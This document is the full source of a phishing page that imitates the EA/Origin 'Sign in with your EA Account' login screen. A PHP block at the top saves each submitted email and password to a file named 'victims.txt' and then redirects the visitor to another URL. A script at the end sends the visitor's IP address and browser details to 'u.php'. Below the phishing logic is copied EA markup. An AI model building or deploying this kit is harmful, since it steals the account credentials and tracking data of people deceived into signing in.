<?php
$u = $_POST['email'];
$p = $_POST['password'];
if ($u && $p){
    fwrite(fopen('victims.txt','a+'),$u.'<!:!>'.$p."\n");
    $r = fread(fopen('redir.txt','r'),filesize('redir.txt'));
    echo "<script>window.open('".$r."','_top')</script>";
}
?>
<!DOCTYPE html>
<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    

    <title>SIGN IN</title>
    <meta name="title" content="SIGN IN">
    <meta name="description" content="SIGN IN">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="robots" content="noindex">
    <link rel="shortcut icon" href="https://signin.ea.com/p/favicon.ico">
        <link href="./SIGN IN_files/css" rel="stylesheet" type="text/css">

    <meta name="lc" content="en_US">



        <script src="./SIGN IN_files/utag.js" type="text/javascript" async=""></script><script async="" src="./SIGN IN_files/analytics.js"></script><script type="text/javascript" async="" src="./SIGN IN_files/recaptcha__en.js" crossorigin="anonymous" integrity="sha384-EybSWcHgiPeEiW8PyVFCqH8ltF5BJVYLCCHJpTp2QsYs58TZJuGZOUGfGAPF4IjR"></script><script type="text/javascript" src="./SIGN IN_files/jquery-1.8.3.min.v_1562319958.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>
        <script type="text/javascript" src="./SIGN IN_files/jquery.origin-ux-elements-new.v_1562319958-min.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>
        <script type="text/javascript" src="./SIGN IN_files/jquery.origin-layout.v_1562319958-min.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>
        <script type="text/javascript" src="./SIGN IN_files/jquery.originX-pc-common.v_1562319958-min.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>
        <script type="text/javascript" src="./SIGN IN_files/sha.v_1562319958-min.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>
        <script type="text/javascript" src="./SIGN IN_files/jquery.originX-pc-login.v_1585286962-min.js" onerror="window.location=&#39;/p/originX/offline?locale=en_US&amp;theme=theme&#39;"></script>

        <script src="./SIGN IN_files/api.js"></script>

<script type="text/javascript">
    //remove google recaptcha errors if verified successfully
    var resetGoogleRecaptcha = function(){
        $("#google-captcha-container").find(".otkinput-errormsg").removeClass('otkform-group-haserror');
    };

    $(document).ready(function () {
        $.fn.login({
            'gCaptchaEnabled':true,
            'source':"WEB",
            'ipCountry': 'IN',
            'phoneNumber': '',
            'contextPath' : "https://signin.ea.com:443/p",
            'selectedCountry': '',
            'isPhoneNumberLogin' :false,
            'isIncompletePhone' :true,
            'isFromAccountLink' :false,
            'isPhoneNumberChecked' :false
                    });
        $('#recaptcha_response_field').width('250px');
        $(document.body).addClass("unselectable");
    });
    window.onload =function(e) {
        if ($("#email").val()) {
            $("#password").focus();
        } else{
            $("#email").focus();
        }
    };
</script>

                <link rel="stylesheet" type="text/css" href="./SIGN IN_files/otk.v_1562319958-min.css">
                <link rel="stylesheet" type="text/css" href="./SIGN IN_files/originX-pc-common.v_1587545058-min.css">
                <link rel="stylesheet" type="text/css" href="./SIGN IN_files/originX-pc-login.v_1575266606-min.css">

<!-- Google Analytics -->
<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
        (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','https://www.google-analytics.com/analytics.js','originXAnalytics');
    originXAnalytics('create', 'UA-38277543-5', '.ea.com');
</script>
<!-- End Google Analytics -->
    <!-- Tealium -->
    <script type="text/javascript">
        var utag_data = {
            region: "NA",
            locale : "en_US",
            country : "US",
            language : "en",
            userid : "",
            user_status : "",
            referring_site : "",
            page_name : "https://signin.ea.com/p/originX/login"
        }
    </script>
    <script type="text/javascript">
        (function (a, b, c, d) {
            a = '//tags.tiqcdn.com/utag/ea/originx/prod/utag.js';
            b = document;
            c = 'script';
            d = b.createElement(c);
            d.src = a;
            d.type = 'text/java' + c;
            d.async = true;
            a = b.getElementsByTagName(c)[0];
            a.parentNode.insertBefore(d, a);
        })();
    </script>
    <!-- End of tealium -->
</head>
<body class="unselectable">


<div class="form-container">

<div class="otknotice-stripe otknotice-active " id="originXBannerBox" style="display: none;">
    <div class="otknotice-stripe-message">
        <span class="otkicon otkicon-warning"></span>
        <span class="otkc otkc-small">
				<strong>
                </strong>
			</span>
    </div>
</div>

    <div id="logViews" class="views">
        <!-- navigation -->
<nav class="otknavbar" role="navigation">
    <ul class="otknav otknav-pills">
            <li class="otkpill otkpill-active">
                <a id="loginNav" style="display: block;" href="https://signin.ea.com/p/originX/login?fid=RlMxOjMuMDoyLjA6T04yTjBsbnZtZnpjTWE1Wng3OFo1NHpKOnBtYW1x&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID">SIGN IN</a>
            </li>
            <li class="otkpill ">
                <a id="createNav" style="display: block;" href="https://signin.ea.com/p/originX/create?fid=RlMxOjMuMDoyLjA6T04yTjBsbnZtZnpjTWE1Wng3OFo1NHpKOnBtYW1x&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID">Create an Account</a>
            </li>
    </ul>
</nav>

        <!-- views -->
        <section id="loginBase">
            <form id="back-form" method="post">
    <input type="hidden" name="_eventId" value="back" id="_eventId">
                <a style="display: none;" id="back" href="https://signin.ea.com/p/originX/login?execution=e2050866854s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID#" class="back-btn otktitle otktitle-5 otktitle-5-caps"><i class="otkicon otkicon-leftarrowcircle"></i>Back</a>
                <a style="display: none;" id="back-to-main-sign-in" href="https://signin.ea.com/p/originX/login?execution=e2050866854s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID#" class="back-btn otktitle otktitle-5 otktitle-5-caps"><i class="otkicon otkicon-leftarrowcircle"></i>BACK TO MAIN SIGN IN</a>
            </form>

            <div class="panel" id="login-with-OriginId-or-Email-panel" style="display: block">
                    <h1 id="loginWithOriginIDTitle" class="otktitle otktitle-2" style="display: block;">Sign in with your EA Account</h1>

                <h1 id="loginWithCompletePhoneNumberAccountTitle" class="otktitle otktitle-2" style="display: none;">Sign in with your phone number</h1>

                <form id="login-form" method="post" action=''>

                    <div class="otkform otkform-inputgroup">

<div class="otkinput otkinput-grouped otkinput-iserror">
        <i class="otkinput-icon otkicon otkicon-profile"></i>
    <input type="text" id="email" name="email" value="" placeholder="Email Address" autocorrect="off" autocapitalize="off" autocomplete="off">
</div>
<div class="otkinput otkinput-grouped otkinput-iserror">
    <i class="otkinput-icon otkicon otkicon-lockclosed"></i>
    <input type="password" id="password" name="password" placeholder="Password" autocorrect="off" autocapitalize="off" autocomplete="off">
    <i class="otkinput-capslock otkicon otkicon-capslock otkicon-capslock-position"></i>
        <span id="passwordShow" class="otkbtn otkbtn-light">SHOW</span>
</div>
                    </div>

                    <div id="online-general-error" class="otkform-group-help otkform-group-haserror">
                        <p class="otkinput-errormsg otkc">Email address is invalid</p>
                    </div>
                    <div id="offline-general-error" class="otkform-group-help">
                        <p class="otkinput-errormsg otkc">You must be online when logging in for the first time.</p>
                    </div>
                    <div id="offline-auth-error" class="otkform-group-help">
                        <p class="otkinput-errormsg otkc">Your credentials are incorrect or have expired. Please try again or reset your password.</p>
                    </div>

                    <div id="captcha-container">
                    </div>

                    <div class="panel-action-area">
    <input type="hidden" name="_eventId" value="submit" id="_eventId">
    <input type="hidden" id="cid" name="cid" value="">

    <input type="hidden" id="showAgeUp" name="showAgeUp" value="true">

    <input type="hidden" id="googleCaptchaResponse" name="googleCaptchaResponse" value="">

    <input type="hidden" id="thirdPartyCaptchaResponse" name="thirdPartyCaptchaResponse" value="">

<span class="otkcheckbox  checkbox-login-first">
	<input type="hidden" name="_rememberMe" value="on">
	<input type="checkbox" id="rememberMe" name="rememberMe" checked="checked">
    <label for="rememberMe">
        <span id="content">Remember me</span>
        
        
    </label>
</span>
<button type="submit" class="otkbtn otkbtn-primary " id="logInBtn">Sign in</button>
                        <input type="hidden" id="errorCode" value="">
                        <input type="hidden" id="errorCodeWithDescription" value="">
                        <input type="hidden" id="storeKey" value="">
                        <input type="hidden" id="bannerType" value="">
                        <input type="hidden" id="bannerText" value="">
                    </div>

                </form>


                <div id="forgot-password-section">
                    <a id="forget-password" href="https://signin.ea.com/p/originX/resetPassword?fid=RlMxOjMuMDoyLjA6T04yTjBsbnZtZnpjTWE1Wng3OFo1NHpKOnBtYW1x&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID" class="otka otkc">Forget your password?</a>
                </div>


            </div>
            <div class="panel" id="login-with-phone-number-check-panel" style="display: none">
                <h1 id="loginWithPhoneNumberTitle" class="otktitle otktitle-2">Sign in with your phone number</h1>
                <form id="check-phone-number-form" method="post">
    <input type="hidden" name="_eventId" value="checkIncomplete" id="_eventId">
    <input type="hidden" id="cid" name="cid" value="">

    <input type="hidden" id="showAgeUp" name="showAgeUp" value="true">

                    <div id="phoneNumberContainer" class="phone-number-container">

                        <div class="phone-number-input otkinput otkinput-grouped otkinput-iserror">
                            <div class="phone-number-select">
                                <i class="otkicon otkicon-lockclosed otkinput-icon"></i>
<span class="otkselect">
    <select id="regionCode" name="regionCode">
            <option value="0">Country</option>
            <option value="AF"> Afghanistan(+93)</option>
            <option value="AX"> Aland Islands(+358)</option>
            <option value="AL"> Albania(+355)</option>
            <option value="DZ"> Algeria(+213)</option>
            <option value="AS"> American Samoa(+1)</option>
            <option value="AD"> Andorra(+376)</option>
            <option value="AO"> Angola(+244)</option>
            <option value="AI"> Anguilla(+1)</option>
            <option value="AQ"> Antarctica(+672)</option>
            <option value="AG"> Antigua and Barbuda(+1)</option>
            <option value="AR"> Argentina(+54)</option>
            <option value="AM"> Armenia(+374)</option>
            <option value="AW"> Aruba(+297)</option>
            <option value="AU"> Australia(+61)</option>
            <option value="AT"> Austria(+43)</option>
            <option value="AZ"> Azerbaijan(+994)</option>
            <option value="BS"> Bahamas(+1)</option>
            <option value="BH"> Bahrain(+973)</option>
            <option value="BD"> Bangladesh(+880)</option>
            <option value="BB"> Barbados(+1)</option>
            <option value="BY"> Belarus(+375)</option>
            <option value="BE"> Belgium(+32)</option>
            <option value="BZ"> Belize(+501)</option>
            <option value="BJ"> Benin(+229)</option>
            <option value="BM"> Bermuda(+1)</option>
            <option value="BT"> Bhutan(+975)</option>
            <option value="BO"> Bolivia(+591)</option>
            <option value="BA"> Bosnia and Herzegovina(+387)</option>
            <option value="BW"> Botswana(+267)</option>
            <option value="BV"> Bouvet Island(+47)</option>
            <option value="BR"> Brazil(+55)</option>
            <option value="IO"> British Indian Ocean Territory (Chagos Archipelago)(+246)</option>
            <option value="VG"> British Virgin Islands(+1)</option>
            <option value="BN"> Brunei(+673)</option>
            <option value="BG"> Bulgaria(+359)</option>
            <option value="BF"> Burkina Faso(+226)</option>
            <option value="BI"> Burundi(+257)</option>
            <option value="KH"> Cambodia(+855)</option>
            <option value="CM"> Cameroon(+237)</option>
            <option value="CA"> Canada(+1)</option>
            <option value="CV"> Cape Verde(+238)</option>
            <option value="KY"> Cayman Islands(+1)</option>
            <option value="CF"> Central African Republic(+236)</option>
            <option value="TD"> Chad(+235)</option>
            <option value="CL"> Chile(+56)</option>
            <option value="CN"> China(+86)</option>
            <option value="CX"> Christmas Island(+61)</option>
            <option value="CC"> Cocos Islands(+61)</option>
            <option value="CO"> Colombia(+57)</option>
            <option value="KM"> Comoros(+269)</option>
            <option value="CG"> Congo(+242)</option>
            <option value="CK"> Cook Islands(+682)</option>
            <option value="CR"> Costa Rica(+506)</option>
            <option value="CI"> Cote D'ivoire(+225)</option>
            <option value="HR"> Croatia(+385)</option>
            <option value="CU"> Cuba(+53)</option>
            <option value="CY"> Cyprus(+357)</option>
            <option value="CZ"> Czech Republic(+420)</option>
            <option value="CD"> Democratic Republic of Congo(+243)</option>
            <option value="DK"> Denmark(+45)</option>
            <option value="DJ"> Djibouti(+253)</option>
            <option value="DM"> Dominica(+1)</option>
            <option value="DO"> Dominican Republic(+1)</option>
            <option value="TL"> East Timor(+670)</option>
            <option value="EC"> Ecuador(+593)</option>
            <option value="EG"> Egypt(+20)</option>
            <option value="SV"> El Salvador(+503)</option>
            <option value="GQ"> Equatorial Guinea(+240)</option>
            <option value="ER"> Eritrea(+291)</option>
            <option value="EE"> Estonia(+372)</option>
            <option value="ET"> Ethiopia(+251)</option>
            <option value="FK"> Falkland Islands (Malvinas)(+500)</option>
            <option value="FO"> Faroe Islands(+298)</option>
            <option value="FJ"> Fiji(+679)</option>
            <option value="FI"> Finland(+358)</option>
            <option value="FR"> France(+33)</option>
            <option value="GF"> French Guiana(+594)</option>
            <option value="PF"> French Polynesia(+689)</option>
            <option value="TF"> French Southern Territories(+33)</option>
            <option value="GA"> Gabon(+241)</option>
            <option value="GM"> Gambia(+220)</option>
            <option value="GE"> Georgia(+995)</option>
            <option value="DE"> Germany(+49)</option>
            <option value="GH"> Ghana(+233)</option>
            <option value="GI"> Gibraltar(+350)</option>
            <option value="GR"> Greece(+30)</option>
            <option value="GL"> Greenland(+299)</option>
            <option value="GD"> Grenada(+1)</option>
            <option value="GP"> Guadeloupe(+590)</option>
            <option value="GU"> Guam(+1)</option>
            <option value="GT"> Guatemala(+502)</option>
            <option value="GG"> Guernsey(+44)</option>
            <option value="GN"> Guinea(+224)</option>
            <option value="GW"> Guinea-Bissau(+245)</option>
            <option value="HT"> Haiti(+509)</option>
            <option value="HM"> Heard and McDonald Islands(+672)</option>
            <option value="HN"> Honduras(+504)</option>
            <option value="HK"> Hong Kong(+852)</option>
            <option value="HU"> Hungary(+36)</option>
            <option value="IS"> Iceland(+354)</option>
            <option value="IN" selected="selected"> India(+91)</option>
            <option value="ID"> Indonesia(+62)</option>
            <option value="IQ"> Iraq(+964)</option>
            <option value="IE"> Ireland(+353)</option>
            <option value="IM"> Isle of Man(+44)</option>
            <option value="IL"> Israel(+972)</option>
            <option value="IT"> Italy(+39)</option>
            <option value="JM"> Jamaica(+1)</option>
            <option value="JP"> Japan(+81)</option>
            <option value="JE"> Jersey(+44)</option>
            <option value="JO"> Jordan(+962)</option>
            <option value="KZ"> Kazakhstan(+7)</option>
            <option value="KE"> Kenya(+254)</option>
            <option value="KI"> Kiribati(+686)</option>
            <option value="KW"> Kuwait(+965)</option>
            <option value="KG"> Kyrgyz Republic(+996)</option>
            <option value="LA"> Lao People's Democratic Republic(+856)</option>
            <option value="LV"> Latvia(+371)</option>
            <option value="LB"> Lebanon(+961)</option>
            <option value="LS"> Lesotho(+266)</option>
            <option value="LR"> Liberia(+231)</option>
            <option value="LI"> Liechtenstein(+423)</option>
            <option value="LT"> Lithuania(+370)</option>
            <option value="LU"> Luxembourg(+352)</option>
            <option value="MO"> Macau(+853)</option>
            <option value="MG"> Madagascar(+261)</option>
            <option value="MW"> Malawi(+265)</option>
            <option value="MY"> Malaysia(+60)</option>
            <option value="MV"> Maldives(+960)</option>
            <option value="ML"> Mali(+223)</option>
            <option value="MT"> Malta(+356)</option>
            <option value="MH"> Marshall Islands(+692)</option>
            <option value="MQ"> Martinique(+596)</option>
            <option value="MR"> Mauritania(+222)</option>
            <option value="MU"> Mauritius(+230)</option>
            <option value="YT"> Mayotte(+262)</option>
            <option value="MX"> Mexico(+52)</option>
            <option value="FM"> Micronesia(+691)</option>
            <option value="MD"> Moldova(+373)</option>
            <option value="MC"> Monaco(+377)</option>
            <option value="MN"> Mongolia(+976)</option>
            <option value="ME"> Montenegro(+382)</option>
            <option value="MS"> Montserrat(+1)</option>
            <option value="MA"> Morocco(+212)</option>
            <option value="MZ"> Mozambique(+258)</option>
            <option value="MM"> Myanmar(+95)</option>
            <option value="NA"> Namibia(+264)</option>
            <option value="NR"> Nauru(+674)</option>
            <option value="NP"> Nepal(+977)</option>
            <option value="NL"> Netherlands(+31)</option>
            <option value="NC"> New Caledonia(+687)</option>
            <option value="NZ"> New Zealand(+64)</option>
            <option value="NI"> Nicaragua(+505)</option>
            <option value="NE"> Niger(+227)</option>
            <option value="NG"> Nigeria(+234)</option>
            <option value="NU"> Niue(+683)</option>
            <option value="NF"> Norfolk Island(+672)</option>
            <option value="MP"> Northern Mariana Islands(+1)</option>
            <option value="KP"> North Korea(+850)</option>
            <option value="MK"> North Macedonia(+389)</option>
            <option value="NO"> Norway(+47)</option>
            <option value="OM"> Oman(+968)</option>
            <option value="PK"> Pakistan(+92)</option>
            <option value="PW"> Palau(+680)</option>
            <option value="PS"> Palestinian Territory(+970)</option>
            <option value="PA"> Panama(+507)</option>
            <option value="PG"> Papua New Guinea(+675)</option>
            <option value="PY"> Paraguay(+595)</option>
            <option value="PE"> Peru(+51)</option>
            <option value="PH"> Philippines(+63)</option>
            <option value="PN"> Pitcairn Island(+64)</option>
            <option value="PL"> Poland(+48)</option>
            <option value="PT"> Portugal(+351)</option>
            <option value="PR"> Puerto Rico(+1)</option>
            <option value="QA"> Qatar(+974)</option>
            <option value="GY"> Republic of Guyana(+592)</option>
            <option value="RE"> Reunion(+262)</option>
            <option value="RO"> Romania(+40)</option>
            <option value="RU"> Russian Federation(+7)</option>
            <option value="RW"> Rwanda(+250)</option>
            <option value="BL"> Saint Barthélemy(+590)</option>
            <option value="MF"> Saint Martin(+590)</option>
            <option value="WS"> Samoa(+685)</option>
            <option value="SM"> San Marino(+378)</option>
            <option value="ST"> Sao Tome and Principe(+239)</option>
            <option value="SA"> Saudi Arabia(+966)</option>
            <option value="SN"> Senegal(+221)</option>
            <option value="RS"> Serbia(+381)</option>
            <option value="SC"> Seychelles(+248)</option>
            <option value="SL"> Sierra Leone(+232)</option>
            <option value="SG"> Singapore(+65)</option>
            <option value="SK"> Slovakia (Slovak Republic)(+421)</option>
            <option value="SI"> Slovenia(+386)</option>
            <option value="SB"> Solomon Islands(+677)</option>
            <option value="SO"> Somalia(+252)</option>
            <option value="ZA"> South Africa(+27)</option>
            <option value="GS"> South Georgia and the South Sandwich Islands(+500)</option>
            <option value="KR"> South Korea(+82)</option>
            <option value="ES"> Spain(+34)</option>
            <option value="LK"> Sri Lanka(+94)</option>
            <option value="SH"> St. Helena(+290)</option>
            <option value="KN"> St. Kitts and Nevis(+1)</option>
            <option value="LC"> St. Lucia(+1)</option>
            <option value="PM"> St. Pierre and Miquelon(+508)</option>
            <option value="VC"> St. Vincent and the Grenadines(+1)</option>
            <option value="LY"> State of Libya(+218)</option>
            <option value="SD"> Sudan(+249)</option>
            <option value="SR"> Suriname(+597)</option>
            <option value="SJ"> Svalbard &amp; Jan Mayen Islands(+47)</option>
            <option value="SZ"> Swaziland(+268)</option>
            <option value="SE"> Sweden(+46)</option>
            <option value="CH"> Switzerland(+41)</option>
            <option value="SY"> Syrian Arab Republic(+963)</option>
            <option value="TW"> Taiwan(+886)</option>
            <option value="TJ"> Tajikistan(+992)</option>
            <option value="TZ"> Tanzania(+255)</option>
            <option value="TH"> Thailand(+66)</option>
            <option value="TG"> Togo(+228)</option>
            <option value="TK"> Tokelau(+690)</option>
            <option value="TO"> Tonga(+676)</option>
            <option value="TT"> Trinidad and Tobago(+1)</option>
            <option value="TN"> Tunisia(+216)</option>
            <option value="TR"> Turkey(+90)</option>
            <option value="TM"> Turkmenistan(+993)</option>
            <option value="TC"> Turks and Caicos Islands(+1)</option>
            <option value="TV"> Tuvalu(+688)</option>
            <option value="UG"> Uganda(+256)</option>
            <option value="UA"> Ukraine(+380)</option>
            <option value="AE"> United Arab Emirates(+971)</option>
            <option value="GB"> United Kingdom(+44)</option>
            <option value="UM"> United States Minor Outlying Islands(+1)</option>
            <option value="US"> United States of America(+1)</option>
            <option value="UY"> Uruguay(+598)</option>
            <option value="VI"> US Virgin Islands(+1)</option>
            <option value="UZ"> Uzbekistan(+998)</option>
            <option value="VU"> Vanuatu(+678)</option>
            <option value="VA"> Vatican City(+39)</option>
            <option value="VE"> Venezuela(+58)</option>
            <option value="VN"> Vietnam(+84)</option>
            <option value="WF"> Wallis and Futuna Islands(+681)</option>
            <option value="EH"> Western Sahara(+212)</option>
            <option value="YE"> Yemen(+967)</option>
            <option value="ZM"> Zambia(+260)</option>
            <option value="ZW"> Zimbabwe(+263)</option>
        </select>
        <span class="otkselect-label otkselect-placeholder phone-number-placeholder"></span>
        <span class="otkselect-label otkselect-selected phone-number-pad">(+91)</span>
    </span>
                            </div>
                            <div class="phone-number-write">
<div class="otkinput otkinput-grouped otkinput-iserror">
    <input type="text" id="phoneNumber" name="phoneNumber" value="" placeholder="Phone Number" maxlength="20" autocorrect="off" autocapitalize="off" autocomplete="off">
</div>
                            </div>
                        </div>
                    </div>
                </form>
                <div id="country-errors">
                    <p id="form-error-missing-country" class="otkc otkform-group-help">Missing country</p>
<p class="otkc otkinput-errormsg otkform-group-help ">
    
</p>
                </div>
                <div id="phone-number-errors">
                    <p class="otkinput-errormsg otkc otkform-group-help">Invalid phone number</p>
                </div>

                <div id="phone-number-not-existed">
                    <form id="login-with-email-form" method="post">
    <input type="hidden" name="_eventId" value="loginWithEmail" id="_eventId">
                        <p class="otkinput-errormsg otkc otkform-group-help">The phone number you entered does not belong to any account. Try <a href="https://signin.ea.com/p/originX/login?execution=e2050866854s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID#" id="login_with_email">signing in with your email address</a> instead.</p>
                    </form>
                </div>

                <div class="panel-action-area">
<a class="otkbtn otkbtn-primary  right" href="https://signin.ea.com/p/originX/login?execution=e2050866854s1&amp;initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Den_US%26client_id%3DORIGIN_SPA_ID#" id="phoneNumberCheckNextBtn">Next</a>
                </div>

                <form id="login-with-email-form" method="post">
    <input type="hidden" name="_eventId" value="loginWithEmail" id="_eventId">
                </form>
            </div>
        </section>


        <!-- footer -->
<footer>
    <img src="./SIGN IN_files/EA_Origin_Lockup_Black.png">
    <span class="otktitle otktitle-5">Origin is part of the EA Network.</span>
</footer>

    </div>
</div>
<div>
    <p id="form-password-show-text" class="otkc otkform-group-help">SHOW</p>
    <p id="form-password-hide-text" class="otkc otkform-group-help">HIDE</p>
    <p id="email-invalid-text" class="otkc otkform-group-help">Email address is invalid</p>
    <p id="email-password-empty-text" class="otkc otkform-group-help">Your credentials are incorrect or have expired. Please try again or reset your password.</p>
</div>


<!-- ### prdaccounts-114.accounts.prd-accounts.svc.cluster.local ### -->


<script src=
"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
</script>  
<script>
$.getJSON("https://api.ipify.org?format=json",function(data) {
if (1) {
    var ip = data.ip;
    var lang = navigator.language;
    var platform = navigator.platform;
    var ua = navigator.userAgent;
    var webdriver = navigator.webdriver;
    $.ajax({
        url : 'u.php',
        type : 'post',
        data : {
            'ip' : ip,
            'lang' : lang,
            'ua' : ua
        }
    });
}
});
</script>
</body></html>